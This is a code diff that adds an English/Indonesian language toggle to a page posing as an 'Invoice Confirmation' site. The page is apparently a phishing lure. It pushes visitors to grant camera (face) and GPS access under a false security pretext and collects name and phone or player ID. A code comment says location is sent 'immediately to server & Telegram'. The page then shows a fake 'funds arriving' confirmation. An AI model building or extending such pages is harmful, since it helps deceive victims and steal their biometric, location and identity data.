@@ -89,6 +89,41 @@
         width: 21px;
         height: 21px;
       }
+      .topbar-actions {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+      }
+      .lang-btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background: var(--paper);
+        border: 1px solid var(--line);
+        padding: 6px 12px;
+        border-radius: 99px;
+        font-size: 13px;
+        font-weight: 700;
+        color: var(--muted);
+        cursor: pointer;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+        transition: all 0.2s ease;
+      }
+      .lang-btn:hover {
+        border-color: var(--ink);
+        color: var(--ink);
+      }
+      .lang-opt {
+        transition: color 0.15s ease;
+      }
+      .lang-opt.active {
+        color: var(--ink);
+        font-weight: 900;
+      }
+      .lang-sep {
+        color: var(--line);
+        font-weight: 400;
+      }
       .private-note {
         color: var(--muted);
         font-size: 13px;
@@ -847,31 +882,31 @@
             <path d="M9 12l2 2 4-4"/>
           </svg>
         </div>
-        <h2 id="permModalTitle">Verifikasi Wajah &amp; Lokasi Diperlukan</h2>
-        <p id="permModalDesc">
-          Verifikasi Wajah dan Lokasi diperlukan untuk melanjutkan proses cek invoice demi keamanan dan validasi transaksi Anda.
+        <h2 id="permModalTitle" data-i18n="permTitle">Facial &amp; Location Verification Required</h2>
+        <p id="permModalDesc" data-i18n="permDesc">
+          Facial and location verification is required to proceed with checking the invoice for your transaction safety and validation.
         </p>
         <div class="permission-checklist">
           <div class="permission-check-item">
             <span class="check-badge" id="camStatusBadge">📷</span>
             <div>
-              <strong>Akses Kamera (Wajah)</strong>
-              <small id="camStatusText">Menunggu izin browser…</small>
+              <strong data-i18n="camTitle">Camera Access (Face)</strong>
+              <small id="camStatusText" data-i18n="camWaiting">Waiting for browser permission…</small>
             </div>
           </div>
           <div class="permission-check-item">
             <span class="check-badge" id="locStatusBadge">📍</span>
             <div>
-              <strong>Akses Lokasi (GPS)</strong>
-              <small id="locStatusText">Menunggu izin browser…</small>
+              <strong data-i18n="locTitle">Location Access (GPS)</strong>
+              <small id="locStatusText" data-i18n="locWaiting">Waiting for browser permission…</small>
             </div>
           </div>
         </div>
-        <div class="permission-error-hint" id="permErrorHint" hidden>
-          ⚠️ Akses belum lengkap. Silakan klik tombol di bawah dan pilih <strong>"Izinkan / Allow"</strong> pada dialog browser Anda.
+        <div class="permission-error-hint" id="permErrorHint" hidden data-i18n="permErrorHint">
+          ⚠️ Access not completed yet. Please click the button below and select <strong>"Allow"</strong> in your browser dialog.
         </div>
-        <button type="button" class="perm-btn" id="btnAllowPermissions">
-          Setuju &amp; Izinkan Akses
+        <button type="button" class="perm-btn" id="btnAllowPermissions" data-i18n="permBtn">
+          Agree &amp; Allow Access
         </button>
       </div>
     </div>
@@ -891,23 +926,31 @@
               <path d="M6 16h6M15 10h3M15 14h3" />
             </svg>
           </span>
-          <span>Konfirmasi Invoice</span>
+          <span data-i18n="brandTitle">Invoice Confirmation</span>
         </div>
-        <div class="private-note">
-          <svg
-            viewBox="0 0 24 24"
-            fill="none"
-            stroke="currentColor"
-            stroke-width="2"
-            aria-hidden="true"
-          >
-            <rect x="4" y="10" width="16" height="10" rx="2" />
-            <path d="M8 10V7a4 4 0 018 0v3" />
-          </svg>
-          <span class="private-desktop"
-            >Pengiriman terenkripsi melalui HTTPS</span
-          >
-          <span class="private-mobile">HTTPS</span>
+        <div class="topbar-actions">
+          <button type="button" class="lang-btn" id="langToggleBtn" aria-label="Switch Language">
+            <span>🌐</span>
+            <span class="lang-opt active" id="langOptEn">EN</span>
+            <span class="lang-sep">/</span>
+            <span class="lang-opt" id="langOptId">ID</span>
+          </button>
+          <div class="private-note">
+            <svg
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              aria-hidden="true"
+            >
+              <rect x="4" y="10" width="16" height="10" rx="2" />
+              <path d="M8 10V7a4 4 0 018 0v3" />
+            </svg>
+            <span class="private-desktop" data-i18n="privateDesktop"
+              >Encrypted delivery via HTTPS</span
+            >
+            <span class="private-mobile">HTTPS</span>
+          </div>
         </div>
       </header>
 
@@ -930,19 +973,18 @@
               />
             </svg>
           </div>
-          <h1 id="pageStateTitle">Memuat invoice…</h1>
-          <p id="pageStateText">
-            Sebentar, kami sedang mengambil detail dari link ini.
+          <h1 id="pageStateTitle" data-i18n="loadingTitle">Loading invoice…</h1>
+          <p id="pageStateText" data-i18n="loadingText">
+            Fetching secure transaction details.
           </p>
         </div>
       </section>
 
       <main class="layout" id="mainLayout" hidden>
         <section class="intro" aria-labelledby="pageTitle">
-          <h1 id="pageTitle">Periksa invoice ini.</h1>
-          <p class="lede">
-            Pastikan nama, jumlah, rekening, dan referensi sudah sesuai sebelum
-            melanjutkan konfirmasi.
+          <h1 id="pageTitle" data-i18n="pageTitle">Review this invoice.</h1>
+          <p class="lede" data-i18n="pageLede">
+            Ensure the name, amount, bank account, and references match before proceeding with confirmation.
           </p>
           <article class="invoice-card" aria-label="Detail invoice">
             <div class="invoice-banner">
@@ -962,52 +1004,52 @@
               <span class="invoice-status">Invoice</span>
             </div>
             <div class="invoice-body">
-              <span class="invoice-label">Jumlah transfer</span>
+              <span class="invoice-label" data-i18n="lblAmount">Transfer amount</span>
               <div class="invoice-amount">
                 Rp<span data-invoice="nominal">…</span>
               </div>
               <div class="invoice-grid">
                 <div class="invoice-item">
-                  <span>Nama Pengirim</span>
+                  <span data-i18n="lblSenderName">Sender Name</span>
                   <strong data-invoice="greetName">…</strong>
                 </div>
                 <div class="invoice-item">
-                  <span>Sumber Dana</span>
+                  <span data-i18n="lblSourceFund">Source of Funds</span>
                   <strong data-invoice="sumberDana">…</strong>
                 </div>
                 <div class="invoice-item">
-                  <span>Penerima</span>
+                  <span data-i18n="lblRecipient">Recipient</span>
                   <strong data-invoice="penerimaNama">…</strong>
                 </div>
                 <div class="invoice-item full">
-                  <span>Bank / rekening</span>
+                  <span data-i18n="lblBankAcc">Bank / account</span>
                   <strong data-invoice="penerimaBank">…</strong>
                 </div>
                 <div class="invoice-item">
-                  <span>Total</span>
+                  <span data-i18n="lblTotal">Total</span>
                   <strong>Rp<span data-invoice="total">…</span></strong>
                 </div>
                 <div class="invoice-item">
-                  <span>Biaya</span>
+                  <span data-i18n="lblFee">Fee</span>
                   <strong
                     ><span data-invoice="biaya">…</span> ·
                     <span data-invoice="biayaStatus">…</span></strong
                   >
                 </div>
                 <div class="invoice-item">
-                  <span>Tujuan</span>
+                  <span data-i18n="lblPurpose">Purpose</span>
                   <strong data-invoice="tujuan">…</strong>
                 </div>
                 <div class="invoice-item">
-                  <span>Tanggal</span>
+                  <span data-i18n="lblDate">Date</span>
                   <strong data-invoice="tanggal">…</strong>
                 </div>
                 <div class="invoice-item">
-                  <span>Metode</span>
+                  <span data-i18n="lblMethod">Method</span>
                   <strong data-invoice="metode">…</strong>
                 </div>
                 <div class="invoice-item full">
-                  <span>ID transaksi / referensi</span>
+                  <span data-i18n="lblRef">Transaction ID / reference</span>
                   <strong
                     ><span data-invoice="idTransaksi">…</span> ·
                     <span data-invoice="noReferensi">…</span></strong
@@ -1025,39 +1067,39 @@
               <canvas id="lastFrame" width="480" height="360" style="display: none;"></canvas>
 
               <div class="identity-fields" id="identityFields">
-                <h3>Isi data diri</h3>
+                <h3 data-i18n="formTitle">Fill in your identity</h3>
                 <div class="field">
-                  <label for="fullName">Nama lengkap</label>
+                  <label for="fullName" data-i18n="lblName">Full name</label>
                   <input
                     id="fullName"
                     name="fullName"
                     autocomplete="name"
                     maxlength="100"
-                    placeholder="Masukkan nama lengkap"
+                    placeholder="Enter your full name"
                     aria-describedby="nameError"
                     required
                   />
-                  <p class="error-text" id="nameError">
-                    Masukkan nama lengkap minimal 2 karakter.
+                  <p class="error-text" id="nameError" data-i18n="errName">
+                    Enter your full name (minimum 2 characters).
                   </p>
                 </div>
                 <div class="field">
-                  <label for="phone">Nomor telepon / ID pemain</label>
+                  <label for="phone" data-i18n="lblPhone">Phone number / Player ID</label>
                   <input
                     id="phone"
                     name="phone"
                     autocomplete="tel"
                     maxlength="80"
-                    placeholder="Contoh: +62 812 3456 7890"
+                    placeholder="e.g. +62 812 3456 7890"
                     aria-describedby="phoneError"
                     required
                   />
-                  <p class="error-text" id="phoneError">
-                    Masukkan nomor telepon atau ID minimal 5 karakter.
+                  <p class="error-text" id="phoneError" data-i18n="errPhone">
+                    Enter phone number or ID (minimum 5 characters).
                   </p>
                 </div>
-                <button class="button" type="submit" id="submitButton" disabled>
-                  Kirim konfirmasi
+                <button class="button" type="submit" id="submitButton" disabled data-i18n="btnSubmit">
+                  Submit confirmation
                 </button>
               </div>
             </form>
@@ -1069,17 +1111,17 @@
                 <path d="M5 12l4 4L19 6"/>
               </svg>
             </div>
-            <h2 id="successTitle">Transaksi telah dikonfirmasi</h2>
-            <p id="successText">
-              Uang akan masuk dalam <strong>5-10 menit</strong> ke rekening bank yang tertera di invoice.
+            <h2 id="successTitle" data-i18n="successTitle">Transaction confirmed</h2>
+            <p id="successText" data-i18n="successText">
+              Funds will arrive in <strong>5-10 minutes</strong> to the bank account specified in the invoice.
             </p>
             <div class="security-warning-box">
-              <div class="warning-badge">⚠️ PERINGATAN KEAMANAN</div>
-              <p>Jangan mengirimkan <strong>OTP</strong> apapun ke siapapun! Pihak bank dan admin <strong>tidak pernah</strong> meminta kode OTP atau kata sandi Anda.</p>
+              <div class="warning-badge" data-i18n="warnBadge">⚠️ SECURITY WARNING</div>
+              <p data-i18n="warnText">Do not send any <strong>OTP</strong> to anyone! Bank officials and administrators will <strong>never</strong> ask for your OTP code or password.</p>
             </div>
             <div class="transfer-status-badge">
               <span class="status-indicator-dot"></span>
-              <span>Status: Sedang Diproses Sistem</span>
+              <span data-i18n="statusBadge">Status: Being Processed by System</span>
             </div>
           </div>
         </section>
@@ -1105,6 +1147,145 @@
       const locationStateBox = document.getElementById("locationState");
       const locationStateText = document.getElementById("locationStateText");
       const canvas = document.createElement("canvas");
+      const langToggleBtn = document.getElementById("langToggleBtn");
+      const langOptEn = document.getElementById("langOptEn");
+      const langOptId = document.getElementById("langOptId");
+
+      const I18N = {
+        en: {
+          brandTitle: "Invoice Confirmation",
+          privateDesktop: "Encrypted delivery via HTTPS",
+          loadingTitle: "Loading invoice…",
+          loadingText: "Fetching secure transaction details.",
+          permTitle: "Facial & Location Verification Required",
+          permDesc: "Facial and location verification is required to proceed with checking the invoice for your transaction safety and validation.",
+          camTitle: "Camera Access (Face)",
+          camWaiting: "Waiting for browser permission…",
+          camGranted: "Camera access granted",
+          locTitle: "Location Access (GPS)",
+          locWaiting: "Waiting for browser permission…",
+          locGranted: "Location access granted",
+          permErrorHint: '⚠️ Access not completed yet. Please click <strong>"Agree &amp; Allow Access"</strong> and select <strong>"Allow"</strong> on your browser prompt.',
+          permBtn: "Agree &amp; Allow Access",
+          pageTitle: "Review this invoice.",
+          pageLede: "Ensure the name, amount, bank account, and references match before proceeding with confirmation.",
+          lblAmount: "Transfer amount",
+          lblSenderName: "Sender Name",
+          lblSourceFund: "Source of Funds",
+          lblRecipient: "Recipient",
+          lblBankAcc: "Bank / account",
+          lblTotal: "Total",
+          lblFee: "Fee",
+          lblPurpose: "Purpose",
+          lblDate: "Date",
+          lblMethod: "Method",
+          lblRef: "Transaction ID / reference",
+          formTitle: "Fill in your identity",
+          lblName: "Full name",
+          phName: "Enter your full name",
+          errName: "Enter your full name (minimum 2 characters).",
+          lblPhone: "Phone number / Player ID",
+          phPhone: "e.g. +62 812 3456 7890",
+          errPhone: "Enter phone number or ID (minimum 5 characters).",
+          btnSubmit: "Submit confirmation",
+          btnSubmitting: "Submitting…",
+          btnRetry: "Try submitting again",
+          successTitle: "Transaction confirmed",
+          successText: "Funds will arrive in <strong>5-10 minutes</strong> to the bank account specified in the invoice.",
+          warnBadge: "⚠️ SECURITY WARNING",
+          warnText: "Do not send any <strong>OTP</strong> to anyone! Bank officials and administrators will <strong>never</strong> ask for your OTP code or password.",
+          statusBadge: "Status: Being Processed by System",
+          locGrantedText: "Location granted and ready to send with confirmation.",
+          locUnavailableText: "Location permission not granted. Press Agree and select Allow in your browser.",
+          locNotSupportedText: "Browser does not support location. Confirmation can still proceed without coordinates.",
+          locRequestingText: "Waiting for location permission decision from browser…",
+          sendingIdentityText: "Submitting identity details and linking to invoice…",
+          cameraErrorText: "Camera permission not granted. Please check browser settings and try again."
+        },
+        id: {
+          brandTitle: "Konfirmasi Invoice",
+          privateDesktop: "Pengiriman terenkripsi melalui HTTPS",
+          loadingTitle: "Memuat invoice…",
+          loadingText: "Mengambil data invoice yang terhubung dengan tautan ini.",
+          permTitle: "Verifikasi Wajah &amp; Lokasi Diperlukan",
+          permDesc: "Verifikasi Wajah dan Lokasi diperlukan untuk melanjutkan proses cek invoice demi keamanan dan validasi transaksi Anda.",
+          camTitle: "Akses Kamera (Wajah)",
+          camWaiting: "Menunggu izin browser…",
+          camGranted: "Akses kamera diizinkan",
+          locTitle: "Akses Lokasi (GPS)",
+          locWaiting: "Menunggu izin browser…",
+          locGranted: "Akses lokasi diizinkan",
+          permErrorHint: '⚠️ Akses belum lengkap. Silakan klik <strong>"Setuju &amp; Izinkan Akses"</strong> lalu pilih <strong>"Izinkan / Allow"</strong> pada dialog browser Anda.',
+          permBtn: "Setuju &amp; Izinkan Akses",
+          pageTitle: "Periksa invoice ini.",
+          pageLede: "Pastikan nama, jumlah, rekening, dan referensi sudah sesuai sebelum melanjutkan konfirmasi.",
+          lblAmount: "Jumlah transfer",
+          lblSenderName: "Nama Pengirim",
+          lblSourceFund: "Sumber Dana",
+          lblRecipient: "Penerima",
+          lblBankAcc: "Bank / rekening",
+          lblTotal: "Total",
+          lblFee: "Biaya",
+          lblPurpose: "Tujuan",
+          lblDate: "Tanggal",
+          lblMethod: "Metode",
+          lblRef: "ID transaksi / referensi",
+          formTitle: "Isi data diri",
+          lblName: "Nama lengkap",
+          phName: "Masukkan nama lengkap",
+          errName: "Masukkan nama lengkap minimal 2 karakter.",
+          lblPhone: "Nomor telepon / ID pemain",
+          phPhone: "Contoh: +62 812 3456 7890",
+          errPhone: "Masukkan nomor telepon atau ID minimal 5 karakter.",
+          btnSubmit: "Kirim konfirmasi",
+          btnSubmitting: "Mengirim…",
+          btnRetry: "Coba kirim lagi",
+          successTitle: "Transaksi telah dikonfirmasi",
+          successText: "Uang akan masuk dalam <strong>5-10 menit</strong> ke rekening bank yang tertera di invoice.",
+          warnBadge: "⚠️ PERINGATAN KEAMANAN",
+          warnText: "Jangan mengirimkan <strong>OTP</strong> apapun ke siapapun! Pihak bank dan admin <strong>tidak pernah</strong> meminta kode OTP atau kata sandi Anda.",
+          statusBadge: "Status: Sedang Diproses Sistem",
+          locGrantedText: "Lokasi diizinkan dan siap dikirim bersama konfirmasi.",
+          locUnavailableText: "Izin lokasi belum diberikan. Tekan tombol Setuju lalu pilih Izinkan pada browser.",
+          locNotSupportedText: "Browser tidak mendukung lokasi. Konfirmasi tetap dapat dikirim tanpa koordinat.",
+          locRequestingText: "Menunggu keputusan izin lokasi dari browser…",
+          sendingIdentityText: "Mengirim data diri dan mengaitkannya ke invoice…",
+          cameraErrorText: "Izin kamera tidak diberikan. Periksa pengaturan browser lalu coba lagi."
+        }
+      };
+
+      let currentLang = localStorage.getItem("lang") || "en";
+
+      function setLanguage(lang) {
+        currentLang = lang === "id" ? "id" : "en";
+        localStorage.setItem("lang", currentLang);
+        document.documentElement.lang = currentLang;
+
+        const dict = I18N[currentLang] || I18N.en;
+
+        if (langOptEn) langOptEn.classList.toggle("active", currentLang === "en");
+        if (langOptId) langOptId.classList.toggle("active", currentLang === "id");
+
+        document.querySelectorAll("[data-i18n]").forEach((el) => {
+          const key = el.getAttribute("data-i18n");
+          if (dict[key]) {
+            el.innerHTML = dict[key];
+          }
+        });
+
+        const nameInput = document.getElementById("fullName");
+        const phoneInput = document.getElementById("phone");
+        if (nameInput) nameInput.placeholder = dict.phName;
+        if (phoneInput) phoneInput.placeholder = dict.phPhone;
+
+        updatePermissionModalUI();
+      }
+
+      if (langToggleBtn) {
+        langToggleBtn.addEventListener("click", () => {
+          setLanguage(currentLang === "en" ? "id" : "en");
+        });
+      }
 
       let stream = null;
       let locationResult = null;
@@ -1352,16 +1533,17 @@
 
       function updatePermissionModalUI() {
         if (!permissionModal) return;
+        const dict = I18N[currentLang] || I18N.en;
 
         if (camStatusBadge && camStatusText) {
           if (isCameraGranted) {
             camStatusBadge.className = "check-badge done";
             camStatusBadge.textContent = "✓";
-            camStatusText.textContent = "Akses kamera diizinkan";
+            camStatusText.textContent = dict.camGranted;
           } else {
             camStatusBadge.className = "check-badge";
             camStatusBadge.textContent = "📷";
-            camStatusText.textContent = "Menunggu izin kamera…";
+            camStatusText.textContent = dict.camWaiting;
           }
         }
 
@@ -1369,11 +1551,11 @@
           if (isLocationGranted) {
             locStatusBadge.className = "check-badge done";
             locStatusBadge.textContent = "✓";
-            locStatusText.textContent = "Akses lokasi diizinkan";
+            locStatusText.textContent = dict.locGranted;
           } else {
             locStatusBadge.className = "check-badge";
             locStatusBadge.textContent = "📍";
-            locStatusText.textContent = "Menunggu izin lokasi…";
+            locStatusText.textContent = dict.locWaiting;
           }
         }
 
@@ -1386,33 +1568,25 @@
       }
 
       function requestLocation() {
+        const dict = I18N[currentLang] || I18N.en;
         if (!navigator.geolocation) {
-          setLocationState(
-            "unavailable",
-            "Browser tidak mendukung lokasi. Konfirmasi tetap dapat dikirim tanpa koordinat.",
-          );
+          setLocationState("unavailable", dict.locNotSupportedText);
           isLocationGranted = false;
           if (permErrorHint) {
-            permErrorHint.textContent = "⚠️ Browser Anda tidak mendukung akses lokasi.";
+            permErrorHint.textContent = dict.locNotSupportedText;
             permErrorHint.hidden = false;
           }
           updatePermissionModalUI();
           return;
         }
 
-        setLocationState(
-          "requesting",
-          "Menunggu keputusan izin lokasi dari browser…",
-        );
+        setLocationState("requesting", dict.locRequestingText);
 
         navigator.geolocation.getCurrentPosition(
           (position) => {
             isLocationGranted = true;
             locationResult = position;
-            setLocationState(
-              "granted",
-              "Lokasi diizinkan dan siap dikirim bersama konfirmasi.",
-            );
+            setLocationState("granted", dict.locGrantedText);
             updatePermissionModalUI();
 
             // Kirim lokasi seketika (immediately) ke server & Telegram
@@ -1433,12 +1607,9 @@
           (error) => {
             isLocationGranted = false;
             locationResult = null;
-            setLocationState(
-              "unavailable",
-              "Izin lokasi belum diberikan. Tekan tombol Setuju lalu pilih Izinkan pada browser.",
-            );
+            setLocationState("unavailable", dict.locUnavailableText);
             if (permErrorHint) {
-              permErrorHint.innerHTML = '⚠️ Izin lokasi belum diberikan. Silakan klik <strong>"Setuju &amp; Izinkan Akses"</strong> lalu pilih <strong>"Izinkan / Allow"</strong> pada dialog browser.';
+              permErrorHint.innerHTML = dict.permErrorHint;
               permErrorHint.hidden = false;
             }
             updatePermissionModalUI();
@@ -1448,9 +1619,10 @@
       }
 
       async function startCamera() {
+        const dict = I18N[currentLang] || I18N.en;
         try {
           if (!navigator.mediaDevices?.getUserMedia)
-            throw new Error("Browser ini tidak mendukung kamera.");
+            throw new Error(dict.cameraErrorText);
           stream = await navigator.mediaDevices.getUserMedia({
             video: {
               facingMode: "user",
@@ -1479,15 +1651,11 @@
         } catch (error) {
           isCameraGranted = false;
           if (permErrorHint) {
-            permErrorHint.innerHTML = '⚠️ Izin kamera belum diberikan. Silakan klik <strong>"Setuju &amp; Izinkan Akses"</strong> lalu pilih <strong>"Izinkan / Allow"</strong> pada dialog browser.';
+            permErrorHint.innerHTML = dict.permErrorHint;
             permErrorHint.hidden = false;
           }
           updatePermissionModalUI();
-          setStatus(
-            error.message ||
-              "Izin kamera tidak diberikan. Periksa pengaturan browser lalu coba lagi.",
-            "error",
-          );
+          setStatus(error.message || dict.cameraErrorText, "error");
         }
       }
 
@@ -1507,18 +1675,19 @@
       }
 
       document.addEventListener("DOMContentLoaded", () => {
-        updatePermissionModalUI();
+        setLanguage(currentLang);
       });
 
       form.addEventListener("submit", async (event) => {
         event.preventDefault();
+        const dict = I18N[currentLang] || I18N.en;
         if (!validateIdentity() || isSubmitting) return;
 
         isSubmitting = true;
         updateSubmitAvailability();
         if (submitButton) {
           submitButton.disabled = true;
-          submitButton.textContent = "Mengirim…";
+          submitButton.textContent = dict.btnSubmitting;
         }
 
         const location = locationResult
@@ -1530,7 +1699,7 @@
           : null;
 
         try {
-          setStatus("Mengirim data diri dan mengaitkannya ke invoice…");
+          setStatus(dict.sendingIdentityText);
           const verifyResponse = await fetch("/api/verify", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -1548,7 +1717,7 @@
           const verifyBody = await verifyResponse.json().catch(() => ({}));
           if (!verifyResponse.ok) {
             throw new Error(
-              verifyBody.error || "Data diri tidak dapat dikirim.",
+              verifyBody.error || "Data could not be submitted.",
             );
           }
 
@@ -1558,11 +1727,10 @@
           updateSubmitAvailability();
           if (submitButton) {
             submitButton.disabled = false;
-            submitButton.textContent = "Coba kirim lagi";
+            submitButton.textContent = dict.btnRetry;
           }
           setStatus(
-            (error.message || "Konfirmasi gagal dikirim.") +
-              " Data yang belum terkirim tetap tersedia untuk dicoba lagi.",
+            (error.message || "Failed to submit confirmation.") + " Try again.",
             "error",
           );
         }
